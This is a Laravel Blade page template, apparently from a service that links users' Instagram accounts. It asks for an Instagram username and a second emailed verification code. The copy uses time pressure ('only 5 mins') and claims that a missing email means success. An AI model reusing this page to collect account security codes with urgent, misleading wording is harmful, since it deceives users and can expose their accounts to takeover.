@section('title', 'Account Verification') @include('default/header')
<div class="content-main d-flex flex" id="content-main">
    <div class="d-flex flex" data-plugin="chat">
        <div class="col-sm-4" style="margin-top: 15px">
            @if(isset($_GET['error']))
            <div class="alert alert-danger" role="alert">{{ $_GET['error'] }}</div>
            @endif
            <form method="post" action="newchallange">
                @csrf
                <div class="box">
                    <div class="box-body">
                        <div class="form-group" style="font-size:12px">
                            <div class="alert alert-danger" role="alert">
                                <li style="margin-bottom: 5px">Your account has been queued to be added!</li>

                                <li style="margin-bottom: 5px">But we need to your 2nd "new" verification code. The code may have been sent to your email address. It may take a few minutes for the code to arrive. You only have 5 mins to enter the code! Please check and enter the verification code.</li>

                                <li style="margin-bottom: 5px">Make sure you entered it correctly. Otherwise, the account will not be added, as we said, we can not control it!</li>
                                
                                <li style="margin-bottom: 5px;color: green">If you have not received any email, that's mean: action has been completed successfully!</li>
                            </div>
                        </div>
                        <div class="form-group">
                            <label>Username</label>
                            <input type="text" name="username" id="username" class="specialfont form-control" placeholder="Username of your Instagram account" required>
                        </div>
                        <div class="form-group">
                            <label>Enter code</label>
                            <input type="number" name="code" id="code" class="specialfont form-control" placeholder="Your verification code" required>
                        </div>
                        <div class="text-right">
                            <button type="submit" class="btn btn-primary specialbutton mainbutton">I have code</button>
                        </div><br>
                        <div class="text-right">
                            <a href="accounts?ok" style="background-image: none;box-shadow: none;background-color: #6e61c285;" class="btn btn-primary specialbutton mainbutton">I haven't code</a>
                        </div>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
@include('default/footer')